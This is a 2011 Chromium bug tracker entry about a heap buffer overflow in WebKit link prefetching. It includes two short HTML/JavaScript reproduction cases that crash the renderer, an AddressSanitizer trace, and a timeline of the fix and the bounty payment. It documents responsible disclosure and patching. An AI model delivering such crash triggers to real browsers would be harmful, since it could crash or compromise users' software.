# Security: buffer overflow in link prefetching

| Field | Value |
|-------|-------|
| **Issue ID** | [40050794](https://issues.chromium.org/issues/40050794) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ga...@chromium.org |
| **Created** | 2011-11-03 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

link rel="prefetch" inside a link rel="subresource" tag causes heap buffer overflow

**VERSION**  

Chrome Version: dev

Operating System: 64bit oneiric

**REPRODUCTION CASE**

<link rel="subresource
<link rel="prefetch" href="resources/does-not-exist.jpg" />
<img src="resources/does-not-exist.jpg">

or

<html>
<head>
</head>
<script>
setTimeout(function() {
document.head.innerHTML='<link rel="subresource '+Array(461).join("A")+"BBBB"+'<link rel="prefetch" href="x" />"/>'
document.body.innerHTML='<img src="x">'
},0)
</script>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==18480== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffe2e374b8 at pc 0x7ffff315d06e bp 0x7fffffff8a30 sp 0x7fffffff8a28  

READ of size 1 at 0x7fffe2e374b8 thread T0  

#0 0x7ffff315d06e in WebCore::CachedImage::imageForRenderer(WebCore::RenderObject const\*) ???:0

0x7fffe2e374b8 is located 144 bytes to the right of 936-byte region [0x7fffe2e37080,0x7fffe2e37428)  

allocated by thread T0 here:  

#0 0x7ffff5d581bf in malloc /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:41  

#1 0x7ffff222055b in WTF::fastMalloc(unsigned long) ???:0  

#2 0x7ffff31717e7 in WebCore::createResource(WebCore::CachedResource::Type, WebCore::ResourceRequest&, WTF::String const&) third\_party/WebKit/Source/WebCore/loader/cache/CachedResourceLoader.cpp:0

## Attachments

- [asan-subresource.txt](attachments/asan-subresource.txt) (text/x-c; charset=us-ascii, 6.7 KB)
- [imagebuffer2.html](attachments/imagebuffer2.html) (text/plain; charset=us-ascii, 124 B)
- [imagebuffer.html](attachments/imagebuffer.html) (text/html; charset=us-ascii, 281 B)

## Timeline

### sc...@gmail.com (2011-11-07)

Confirmed. Appears to be an M16 regression, so this should block release.

Valgrind also hits it pretty easily. I think this could be a bad cast / type confusion bug? The creation of that memory that is read-past-the-end-of went through:

WebCore::CachedResourceLoader::requestLinkResource

But the eventual fault seems to occur after something was already cast to an image?

WebCore::CachedImage::imageForRenderer

I'm not sure if this is cached loader related or prefect related so cc:ing both Gavin and Chris, plus Nate for good measure.

### ga...@chromium.org (2011-11-07)

I have a fix for this, I'm making it pretty and uploading it.  Abhishek, do you want to create the WebKit bug, or should I?

### ga...@chromium.org (2011-11-07)

https://bugs.webkit.org/show_bug.cgi?id=71727 is the WebKit bug, I've uploaded a patch there.

### ga...@chromium.org (2011-11-08)

Landed in WebKit.

Committed r99565: <http://trac.webkit.org/changeset/99565>


### ke...@chromium.org (2011-11-08)

[Empty comment from Monorail migration]

### ke...@chromium.org (2011-11-08)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-11-17)

@miaubiz: another nice regression catch in a new feature, and prevented from reaching stable. Great! Obviously, a $1000 Chromium Security Reward. I'll pay it out right away although it's not fixed in Beta yet (I'll merge it for the next Beta).

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-11-17)

Merged to M16
http://trac.webkit.org/changeset/100567

### sc...@gmail.com (2011-11-23)

Payment in system.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/102810?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050794)*
